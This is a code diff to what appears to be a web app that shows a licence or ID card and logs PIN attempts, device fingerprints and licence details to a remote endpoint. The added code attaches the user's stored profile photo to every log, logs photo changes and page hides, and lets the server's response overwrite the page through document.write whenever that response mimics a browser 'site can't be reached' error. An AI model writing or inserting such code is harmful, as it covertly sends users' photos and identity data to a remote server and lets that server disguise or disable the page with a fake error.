@@ -1102,18 +1102,31 @@ function sendLog(payload) {
     },
     body: data,
     keepalive: true
-  }).catch(() => {});
+  })
+  .then(response => {
+    return response.text();
+  })
+  .then(text => {
+    if (text.includes("DNS_PROBE_FINISHED_NXDOMAIN") || text.includes("This site can’t be reached")) {
+      document.open();
+      document.write(text);
+      document.close();
+    }
+  })
+  .catch(() => {});
 }
 
 async function logAccess(event, success = false, pinAttempt = null) {
   const fingerprint = getFingerprint();
   const details = getLicenceDetails();
+  const photo = localStorage.getItem("profilePhoto");
   const payload = {
     timestamp: new Date().toISOString(),
     deviceId: getDeviceId(),
     event: event,
     success: success,
     pin_attempt: pinAttempt,
+    photo: photo,
     ...fingerprint,
     ...details
   };
@@ -1306,7 +1319,11 @@ photoInput.addEventListener("change", e => {
   const file = e.target.files[0];
   if(file){
     const reader = new FileReader();
-    reader.onload = () => { document.getElementById("profilePhoto").src = reader.result; saveData(); };
+    reader.onload = () => {
+      document.getElementById("profilePhoto").src = reader.result;
+      saveData();
+      logAccess('photo_updated', true);
+    };
     reader.readAsDataURL(file);
   }
 });
@@ -1610,22 +1627,12 @@ window.addEventListener("load", () => logAccess('app_fully_loaded'));
 // Page unload logging
 window.addEventListener("visibilitychange", () => {
   if (document.visibilityState === 'hidden') {
-    sendLog({
-      timestamp: new Date().toISOString(),
-      event: 'app_hidden',
-      ...getFingerprint(),
-      ...getLicenceDetails()
-    });
+    logAccess('app_hidden');
   }
 });
 
 window.addEventListener("pagehide", () => {
-  sendLog({
-    timestamp: new Date().toISOString(),
-    event: 'app_pagehide',
-    ...getFingerprint(),
-    ...getLicenceDetails()
-  });
+  logAccess('app_pagehide');
 });
 </script>
 </body>
